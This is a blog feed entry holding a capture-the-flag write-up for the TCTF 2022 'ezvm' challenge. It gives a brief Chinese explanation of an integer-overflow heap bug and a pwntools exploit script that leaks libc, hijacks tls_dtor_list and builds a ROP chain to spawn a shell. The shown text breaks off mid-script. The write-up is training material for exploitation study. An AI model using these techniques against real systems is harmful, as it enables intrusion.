{
    "version": "https://jsonfeed.org/version/1",
    "title": "我他喵的",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2022/09/20/tctf2022ezvm/",
            "url": "http://example.com/2022/09/20/tctf2022ezvm/",
            "title": "tctf2022ezvm",
            "date_published": "2022-09-20T06:08:33.000Z",
            "content_html": "<h3 id=\"思路\"><a class=\"markdownIt-Anchor\" href=\"#思路\">#</a> 思路</h3>\n<p>在申请 memery 的时候存在整数溢出，程序虽然会检测到，但是允许我们进行一次的整数溢出申请，这样实际的 memery 的 count 很大，但是 chunk 的大小远小于这个值，造成了堆块的越界读写。<br>\n当我们申请一个很大的堆块，会在 libc 附近分配，配合越界写，我们就可以修改 tls_dtor_list, 以及 secret 的值。<br>\nchunk 的释放冲 i 性能申请没有对其进行清空，所以，我们申请出一个 largebin 范围的 chunk，然后释放，这样再次将其申请出来的时候，在 memery [1] 会存有一个指针，就可以知道 libc 的及地址了。将这个数据存在这个 chunk+0x1d0 附近，在这里写一些数据，拼接出 mov_r_i 的指令，以及一个 jmp 到低地址的指令 释放。然后我们我们这次的时候，codesize 为 0x200, 就会将刚写进去的拼接指令，放到 code 的靠后的位置，我们只需要在 code 的最开始写一个 jmp，让 vm 跳到我们刚写的拼接指令哪里，将 libc 的放入寄存器。同时这一次的 memerycount 要发生溢出，并且在 libc 附近申请到一个 chunk. 这样根据偏移量，结合程序的一些基本运算，就得到了函数地址，gadget 地址。然后修改 tls_dtor_list 到 heap 上，并在哪里填充 rop, 以及修改 searet 的值。最后触发程序错误，直接 exit，getshell</p>\n<h3 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h3>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#r=process(&#x27;./ezvm&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;202.120.7.210&#x27;</span>,<span class=\"number\">40241</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">code =<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">push</span>(<span class=\"params\">rig</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">0</span>)+p8(rig)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pop</span>(<span class=\"params\">rig</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">1</span>)+p8(rig)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode+=p8(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sub</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">imul</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">div</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode+=p8(<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">yu</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">6</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">left</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode+=p8(<span class=\"number\">7</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">right</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">And</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Or</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">11</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">xor</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">12</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">judge0</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">13</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">jmp</span>(<span class=\"params\">address</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">14</span>)+p64(address)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">jnz</span>(<span class=\"params\">address</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">15</span>)+p64(address)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">jz</span>(<span class=\"params\">address</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">16</span>)+p64(address)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cmpequ</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode+=p8(<span class=\"number\">17</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cmpsml</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode+=p8(<span class=\"number\">18</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cmpbig</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">19</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mov_r_i</span>(<span class=\"params\">rig,num</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode+=p8(<span class=\"number\">20</span>)+p8(rig)+p64(num)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mov_m_r</span>(<span class=\"params\">rig,offset</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">21</span>)+p8(rig)+p64(offset)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mov_r_m</span>(<span class=\"params\">rig,offset</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">22</span>)+p8(rig)+p64(offset)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">clear</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode = <span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"comment\">#size(stack) = 0x800 ====&gt;we can use it to save 0x100 nums</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">runcode</span>(<span class=\"params\">code,code_size,mem_size</span>):</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Please input your code size:&quot;</span>,<span class=\"built_in\">str</span>(code_size))</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Please input your memory count:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">int</span>(mem_size/<span class=\"number\">8</span>)))</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Please input your code:&quot;</span>,code)</span><br><span class=\"line\"></span><br><span class=\"line\">mov_r_i(<span class=\"number\">0</span>,<span class=\"number\">0x111111</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,<span class=\"number\">0x222222</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">2</span>,<span class=\"number\">0x333333</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">3</span>,<span class=\"number\">0x444444</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">push(<span class=\"number\">2</span>)</span><br><span class=\"line\">push(<span class=\"number\">3</span>)</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(code))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Welcome to 0ctf2022!!&quot;</span>,<span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">runcode(code,<span class=\"number\">0xf0</span>,<span class=\"number\">0x600</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;brva 0x000001582&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">clear()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak the libc</span></span><br><span class=\"line\"></span><br><span class=\"line\">mov_r_m(<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_r_m(<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,<span class=\"number\">0x219ce0</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,<span class=\"number\">0x219ce0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">push(<span class=\"number\">2</span>)</span><br><span class=\"line\">push(<span class=\"number\">3</span>)</span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">sub()</span><br><span class=\"line\">pop(<span class=\"number\">0</span>)<span class=\"comment\">#put libc into heap</span></span><br><span class=\"line\"></span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,<span class=\"number\">0x14000000000000</span>)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">1</span>,<span class=\"number\">0x3a</span>-<span class=\"number\">0xa</span>)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">0</span>,<span class=\"number\">0x3b</span>-<span class=\"number\">0xa</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,<span class=\"number\">0xfffffffffffe700e</span>)<span class=\"comment\">#jmp</span></span><br><span class=\"line\">mov_m_r(<span class=\"number\">1</span>,<span class=\"number\">0x3c</span>-<span class=\"number\">0xa</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">2</span>,<span class=\"number\">0xffff</span>)<span class=\"comment\">#addr</span></span><br><span class=\"line\">mov_m_r(<span class=\"number\">2</span>,<span class=\"number\">0x3d</span>-<span class=\"number\">0xa</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(code))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;continue&quot;</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">runcode(code,<span class=\"number\">0xf0</span>,<span class=\"number\">0x600</span>)</span><br><span class=\"line\">clear()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#we have the libc in mem</span></span><br><span class=\"line\">tls_offset = <span class=\"number\">0x0028c0</span>  <span class=\"comment\">#libc - </span></span><br><span class=\"line\">tls_dtor_list_offset = <span class=\"number\">0x0416d8</span><span class=\"comment\">#libc-</span></span><br><span class=\"line\">secret_offset = <span class=\"number\">0x0028c0</span>-<span class=\"number\">0x30</span></span><br><span class=\"line\">heap_offset = <span class=\"number\">0x43ff0</span></span><br><span class=\"line\">sec_heap_offset = <span class=\"number\">0x0082ec</span></span><br><span class=\"line\">tls_dtor_list_heap_offset = <span class=\"number\">0x0082bb</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\"><span class=\"comment\">#code3 we need to malloc  a big one</span></span><br><span class=\"line\"></span><br><span class=\"line\">jmp(<span class=\"number\">0x000186</span>-<span class=\"number\">9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">0</span>,<span class=\"number\">0</span>)\t<span class=\"comment\">#memery[0]  ==libc</span></span><br><span class=\"line\"><span class=\"comment\"># mov_r_i(1,secret_offset)</span></span><br><span class=\"line\"><span class=\"comment\"># push(1)</span></span><br><span class=\"line\"><span class=\"comment\"># sub()</span></span><br><span class=\"line\"><span class=\"comment\"># pop(2)</span></span><br><span class=\"line\"><span class=\"comment\"># mov_m_r(2,1)\t#memery[1] = secret_address</span></span><br><span class=\"line\">sec = <span class=\"number\">0x5143329d0ccc697</span></span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,sec)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">1</span>,sec_heap_offset)\t<span class=\"comment\">#secret = 0xcafebabedeadbeef</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pos_offset = <span class=\"built_in\">int</span>(<span class=\"number\">0x100</span>/<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">#read rop to che chunk </span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;rop</span></span><br><span class=\"line\"><span class=\"string\">leave_ret = libc + 0x000562ec</span></span><br><span class=\"line\"><span class=\"string\">prdi = libc + 0x002a3e5</span></span><br><span class=\"line\"><span class=\"string\">prsi = libc + 0x02be51</span></span><br><span class=\"line\"><span class=\"string\">prdx_pr12 = libc +0x011f497</span></span><br><span class=\"line\"><span class=\"string\">binsh = libc + 0x001d8698</span></span><br><span class=\"line\"><span class=\"string\">execve = libc + 0xeb0f0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">addr = ((leave_ret^sec)&lt;&lt;0x11)&amp;0xffffffffffff8000</span></span><br><span class=\"line\"><span class=\"string\">addr += ((leave_ret^sec)&gt;&gt;0x2f)&amp;0x7fff</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">rop = p64(prdi) + p64(binsh)</span></span><br><span class=\"line\"><span class=\"string\">rop += p64(prsi) + p64(0)</span></span><br><span class=\"line\"><span class=\"string\">rop += p64(prdx_pr12) + p64(0)*2</span></span><br><span class=\"line\"><span class=\"string\">rop += p64(execve)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">leave_ret =  <span class=\"number\">0x000562ec</span></span><br><span class=\"line\">prdi =  <span class=\"number\">0x002a3e5</span></span><br><span class=\"line\">prsi =  <span class=\"number\">0x02be51</span></span><br><span class=\"line\">prdx_pr12 = <span class=\"number\">0x011f497</span></span><br><span class=\"line\">binsh = <span class=\"number\">0x001d8698</span></span><br><span class=\"line\">execve =  <span class=\"number\">0xeb0f0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#write leave ret</span></span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,leave_ret)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">add()</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,sec)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">xor()</span><br><span class=\"line\">pop(<span class=\"number\">2</span>)</span><br><span class=\"line\">push(<span class=\"number\">2</span>)\t\t<span class=\"comment\">#2 xor save</span></span><br><span class=\"line\">push(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,<span class=\"number\">0x11</span>)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">left()</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,<span class=\"number\">0xffffffffffff8000</span>)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">And()</span><br><span class=\"line\">pop(<span class=\"number\">2</span>)\t\t<span class=\"comment\">#addr lef</span></span><br><span class=\"line\">pop(<span class=\"number\">3</span>)\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">push(<span class=\"number\">3</span>)\t\t<span class=\"comment\">#xor res</span></span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,<span class=\"number\">0x2f</span>)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">right()</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,<span class=\"number\">0x7fff</span>)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">And()</span><br><span class=\"line\">push(<span class=\"number\">2</span>)</span><br><span class=\"line\">add()</span><br><span class=\"line\">pop(<span class=\"number\">2</span>)\t\t\t\t<span class=\"comment\">#leave_ret_encrept</span></span><br><span class=\"line\"></span><br><span class=\"line\">mov_m_r(<span class=\"number\">2</span>,pos_offset)</span><br><span class=\"line\">pos_offset+=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pop _rdi</span></span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,prdi)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">add()</span><br><span class=\"line\">pop(<span class=\"number\">2</span>)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">2</span>,pos_offset)</span><br><span class=\"line\">pos_offset+=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#binsh</span></span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,binsh)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">add()</span><br><span class=\"line\">pop(<span class=\"number\">2</span>)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">2</span>,pos_offset)</span><br><span class=\"line\">pos_offset+=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pop rsi</span></span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,prsi)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">add()</span><br><span class=\"line\">pop(<span class=\"number\">2</span>)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">2</span>,pos_offset)</span><br><span class=\"line\">pos_offset+=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#0</span></span><br><span class=\"line\">pos_offset+=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#prdx 0 0</span></span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,prdx_pr12)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">add()</span><br><span class=\"line\">pop(<span class=\"number\">2</span>)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">2</span>,pos_offset)</span><br><span class=\"line\">pos_offset+=<span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#execve</span></span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,execve)</span><br><span class=\"line\">push(<span 